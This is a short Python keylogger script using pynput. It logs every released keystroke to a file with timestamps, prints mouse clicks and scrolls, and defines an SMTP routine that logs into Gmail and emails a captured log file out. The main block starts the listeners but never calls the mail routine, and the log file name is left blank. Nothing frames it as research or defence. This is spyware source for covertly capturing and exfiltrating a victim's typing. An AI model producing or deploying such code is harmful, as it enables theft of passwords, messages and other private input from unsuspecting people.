from pynput.keyboard import Key
from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import datetime
import smtplib
import threading

inp = []
count = 0
COUNT_LIMIT = 100
EMAIL = ""
PASSWORD = ""

KEYS = {
    Key.space: lambda: inp.append(" "),
    Key.backspace: lambda: inp.pop() if len(inp) > 0 else print('Invalid'),
    Key.right: lambda: inp.append(' —RIGHT— '),
    Key.left: lambda: inp.append(' —LEFT— ')
}

class LogTools:

    def press(self, key):
        pass

    def release(self, key):
        global inp, count
        count += 1
        with open('', 'a', encoding='utf-8') as f:

            if count == COUNT_LIMIT:
                f.write(f"{datetime.datetime.now()} — " + "".join(inp) + '\n')
                inp = []

            if key in KEYS:
                KEYS[key]()

            elif key == Key.enter:

                f.write(f"{datetime.datetime.now()} — " + "".join(inp) + '\n')
                inp = []

            else:
                inp += str(key).replace("'", "")

    def click(self, x, y, button, click):
        print(x, y, button, click)

    def scroll(self, x, y, dx, dy):
        print(x, y, dx, dy)

    @property
    def keyboard(self):

        keyboard_listener = KeyboardListener(on_press=self.press, on_release=self.release)
        return keyboard_listener

    @property
    def mouse(self):

        mouse_listener = MouseListener(on_click=self.click, on_scroll=self.scroll)
        return mouse_listener

    @staticmethod
    def send_to(email, password):

        with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
            smtp.ehlo()
            smtp.starttls()
            smtp.ehlo()

            smtp.login(email, password)

            with open('res.txt', 'r') as f:
                msg = f.read()
            smtp.sendmail(email, email, msg)

if __name__ == "__main__":
    tools = LogTools()

    keyboardTool = tools.keyboard
    mouseTool = tools.mouse

    keyboardTool.start()
    mouseTool.start()
    keyboardTool.join()
    mouseTool.join()


